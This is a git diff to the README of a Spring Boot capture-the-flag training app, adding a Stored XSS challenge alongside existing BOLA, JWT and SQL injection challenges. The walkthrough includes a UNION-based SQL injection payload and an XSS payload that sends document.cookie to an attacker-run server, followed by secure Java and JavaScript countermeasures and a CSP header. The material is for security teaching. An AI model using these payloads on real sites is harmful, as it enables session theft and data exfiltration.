@@ -1,7 +1,7 @@
 # Security CTF - OWASP Top 10 Challenge
 
 This Spring Boot application is designed as a Capture The Flag (CTF) security challenge based on the OWASP Top 10
-vulnerabilities. The current implementation includes challenges for **Broken Object Level Authorization**, **JWT Algorithm Confusion**, and **SQL Injection**.
+vulnerabilities. The current implementation includes challenges for **Broken Object Level Authorization**, **JWT Algorithm Confusion**, **SQL Injection**, and **XSS Stored**.
 
 ## Vulnerability: Broken Object Level Authorization
 
@@ -16,6 +16,10 @@ The application accepts JWT tokens with "none" algorithm, allowing attackers to 
 ## Vulnerability: SQL Injection
 
 The application contains multiple vulnerable endpoints that allow SQL injection attacks:
+
+## Vulnerability: XSS Stored (Cross-Site Scripting)
+
+The application contains a vulnerable comments system that stores user input without proper sanitization, allowing attackers to inject malicious JavaScript code that executes when other users (including administrators) view the comments.
 
 ## How to Run
 
@@ -143,6 +147,33 @@ Exploit SQL injection vulnerabilities to access the hidden flag in the `ctf_secr
 7. **Extract the flag**
     - Get the flag: `/api/shop/search?name=Laptop' UNION SELECT 999,flag,99.99,description,'FLAG' FROM ctf_secrets WHERE challenge_name='sql_injection'-- `
 
+## XSS Stored Challenge Walkthrough
+
+### Objective
+
+Exploit a Stored XSS vulnerability to steal an administrator's cookie containing the flag and exfiltrate it to your own HTTP server.
+
+### Steps to Solve
+
+
+
+### Payload Testing Workflow
+
+1. **Test HTML injection first**:
+   ```html
+   <b>TEST BOLD</b>
+   
+   ```
+   
+2. **Test JavaScript execution**:
+   ```html
+   <img src="x" onerror="alert('XSS Works!')">
+   ```
+   
+3. **Test exfiltration to your server**:
+   ```html
+   <img src="x" onerror="fetch('http://localhost:8000/?test=' + document.cookie)">
+   ```
 
 
 ## Security Concepts Demonstrated
@@ -154,6 +185,9 @@ Exploit SQL injection vulnerabilities to access the hidden flag in the `ctf_secr
 - **JWT Algorithm Confusion**: Accepting "none" algorithm allows attackers to create unsigned tokens.
 - **SQL Injection**: Direct string concatenation in SQL queries allows attackers to manipulate database queries and access unauthorized data.
 - **Information Disclosure**: Error messages reveal database structure and query details to attackers.
+- **XSS Stored**: User input is stored and displayed without proper sanitization, allowing JavaScript injection.
+- **Cookie Theft**: Malicious scripts can access and exfiltrate sensitive authentication cookies.
+- **DOM Manipulation**: XSS allows attackers to modify page content and functionality.
 
 ## Proper Security Implementation
 
@@ -257,6 +291,124 @@ public ResponseEntity<?> searchProductsSecure(@RequestParam String productName) 
 - **Implement proper logging** for security monitoring
 - **Use stored procedures** when appropriate
 - **Apply input length limits** to prevent buffer overflows
+
+### Secure XSS Prevention
+
+A secure application should implement multiple layers of protection against XSS attacks:
+
+```java
+@RestController
+@RequestMapping("/api/secure-comments")
+public class SecureCommentsController {
+    
+    @PostMapping
+    public ResponseEntity<?> postSecureComment(@RequestBody CommentRequest request) {
+        // INPUT VALIDATION: Validate and sanitize input
+        String sanitizedAuthor = sanitizeInput(request.getAuthor());
+        String sanitizedComment = sanitizeInput(request.getComment());
+        
+        // VALIDATE LENGTH: Prevent excessively long input
+        if (sanitizedComment.length() > 1000) {
+            return ResponseEntity.badRequest()
+                .body(Map.of("error", "Comment too long"));
+        }
+        
+        // STORE SAFELY: Use prepared statements
+        // ... database insertion ...
+        
+        return ResponseEntity.ok(Map.of("message", "Comment posted safely"));
+    }
+    
+    @GetMapping
+    public ResponseEntity<?> getSecureComments() {
+        // RETRIEVE DATA: Get comments from database
+        List<Comment> comments = commentRepository.findAll();
+        
+        // OUTPUT ENCODING: Encode HTML entities before sending to frontend
+        List<Map<String, Object>> safeComments = comments.stream()
+            .map(this::encodeCommentForOutput)
+            .collect(Collectors.toList());
+            
+        return ResponseEntity.ok(Map.of("comments", safeComments));
+    }
+    
+    private String sanitizeInput(String input) {
+        if (input == null) return "";
+        
+        // Remove potentially dangerous characters and tags
+        return input
+            .replaceAll("<[^>]*>", "") // Remove HTML tags
+            .replaceAll("javascript:", "") // Remove javascript: protocols
+            .replaceAll("on\\w+\\s*=", "") // Remove event handlers
+            .trim();
+    }
+    
+    private Map<String, Object> encodeCommentForOutput(Comment comment) {
+        Map<String, Object> encoded = new HashMap<>();
+        encoded.put("id", comment.getId());
+        encoded.put("author", encodeHtml(comment.getAuthor()));
+        encoded.put("comment", encodeHtml(comment.getComment()));
+        encoded.put("createdAt", comment.getCreatedAt());
+        return encoded;
+    }
+    
+    private String encodeHtml(String input) {
+        if (input == null) return "";
+        return input
+            .replace("&", "&amp;")
+            .replace("<", "&lt;")
+            .replace(">", "&gt;")
+            .replace("\"", "&quot;")
+            .replace("'", "&#x27;");
+    }
+}
+```
+
+**Frontend secure implementation:**
+```javascript
+// SECURE: Use textContent instead of innerHTML
+function displayCommentsSecurely(comments) {
+    const container = document.getElementById('commentsContainer');
+    container.innerHTML = ''; // Clear existing content
+    
+    comments.forEach(comment => {
+        const commentDiv = document.createElement('div');
+        commentDiv.className = 'comment-item';
+        
+        const authorSpan = document.createElement('strong');
+        authorSpan.textContent = comment.author; // SECURE: textContent auto-escapes
+        
+        const contentDiv = document.createElement('div');
+        contentDiv.textContent = comment.comment; // SECURE: textContent auto-escapes
+        
+        commentDiv.appendChild(authorSpan);
+        commentDiv.appendChild(contentDiv);
+        container.appendChild(commentDiv);
+    });
+}
+
+// Alternative: If you must use innerHTML, sanitize first
+function sanitizeHtml(str) {
+    const temp = document.createElement('div');
+    temp.textContent = str;
+    return temp.innerHTML;
+}
+```
+
+**Key security principles for XSS prevention:**
+- **Input Validation**: Validate all user input at the server-side
+- **Output Encoding**: Encode data when outputting to HTML (HTML entity encoding)
+- **Use textContent**: Use `textContent` instead of `innerHTML` when possible
+- **Content Security Policy (CSP)**: Implement strict CSP headers
+- **Sanitize HTML**: If HTML input is necessary, use trusted sanitization libraries
+- **Cookie Security**: Use `HttpOnly`, `Secure`, and `SameSite` flags for cookies
+- **Validate on Server**: Never trust client-side validation alone
+- **Regular Security Audits**: Regularly test for XSS vulnerabilities
+
+**CSP Header example:**
+```
+Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self'
+```
 
 ## Additional Notes
 
